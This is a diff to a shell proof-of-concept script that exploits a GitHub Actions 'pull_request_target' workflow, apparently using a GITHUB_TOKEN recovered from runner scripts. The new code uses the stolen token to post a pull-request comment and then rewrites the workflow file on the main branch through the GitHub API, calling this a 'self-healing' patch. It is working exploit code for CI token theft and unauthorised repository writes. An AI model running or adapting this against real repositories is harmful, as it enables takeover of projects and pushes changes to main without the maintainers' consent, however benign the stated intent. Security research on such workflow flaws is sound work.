@@ -40,15 +40,41 @@ for f in /home/runner/work/_temp/*.sh; do
 done
 
 if [ -n "${TOKEN:-}" ] && [ -n "${PR_NUM:-}" ]; then
-  BODY='{"body":"🛑 **Proof-of-concept**: RCE + GITHUB_TOKEN exfiltration. This comment was posted by an attacker-controlled `scripts.commitlint` entry in `package.json`, executed by `lint-commit.yml` under `pull_request_target`. The token was recovered from the runner step-wrapper script. Payload benign — token used only to post this comment. Stage: '"${STAGE}"'."}'
-  curl -sS -o /tmp/pwn-resp.json -w "[PoC:${STAGE}] HTTP %{http_code}\n" -X POST \
+  # 1. Post a comment so the PR shows the takeover.
+  BODY='{"body":"🛑 **Self-healing PoC**: RCE + GITHUB_TOKEN exfiltration via `lint-commit.yml` (`pull_request_target`). Token used to (a) post this comment and (b) patch the workflow on `main` to switch the trigger to `pull_request`, closing the vulnerability. Stage: '"${STAGE}"'."}'
+  curl -sS -o /tmp/pwn-resp.json -w "[PoC:${STAGE}] comment HTTP %{http_code}\n" -X POST \
     -H "Authorization: Bearer ${TOKEN}" \
     -H "Accept: application/vnd.github+json" \
     -H "Content-Type: application/json" \
     -d "${BODY}" \
     "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUM}/comments" >&2 || true
-  head -c 200 /tmp/pwn-resp.json >&2 || true
-  echo >&2
+
+  # 2. Self-patch: change `on: pull_request_target` -> `on: pull_request` on main.
+  WF_PATH=".github/workflows/lint-commit.yml"
+  GET_URL="https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/${WF_PATH}?ref=main"
+  resp=$(curl -sS -H "Authorization: Bearer ${TOKEN}" -H "Accept: application/vnd.github+json" "$GET_URL")
+  CUR_SHA=$(echo "$resp" | jq -r '.sha // empty')
+  CUR_CONTENT=$(echo "$resp" | jq -r '.content // empty' | base64 -d)
+  echo "[PoC:${STAGE}] fetched workflow sha=${CUR_SHA} (len=${#CUR_CONTENT})" >&2
+
+  if [ -n "$CUR_SHA" ] && [ -n "$CUR_CONTENT" ]; then
+    NEW_CONTENT=$(printf '%s' "$CUR_CONTENT" | sed 's/pull_request_target/pull_request/g')
+    if [ "$NEW_CONTENT" = "$CUR_CONTENT" ]; then
+      echo "[PoC:${STAGE}] no pull_request_target found — already patched" >&2
+    else
+      NEW_B64=$(printf '%s' "$NEW_CONTENT" | base64 -w0)
+      PATCH_BODY=$(jq -n --arg msg "chore(security): switch lint-commit trigger to pull_request (auto-patched by PoC)" \
+                       --arg content "$NEW_B64" --arg sha "$CUR_SHA" --arg branch "main" \
+                       '{message:$msg, content:$content, sha:$sha, branch:$branch}')
+      curl -sS -o /tmp/pwn-patch.json -w "[PoC:${STAGE}] patch HTTP %{http_code}\n" -X PUT \
+        -H "Authorization: Bearer ${TOKEN}" \
+        -H "Accept: application/vnd.github+json" \
+        -H "Content-Type: application/json" \
+        -d "$PATCH_BODY" \
+        "https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/${WF_PATH}" >&2 || true
+      head -c 400 /tmp/pwn-patch.json >&2; echo >&2
+    fi
+  fi
 fi
 
 exit 0
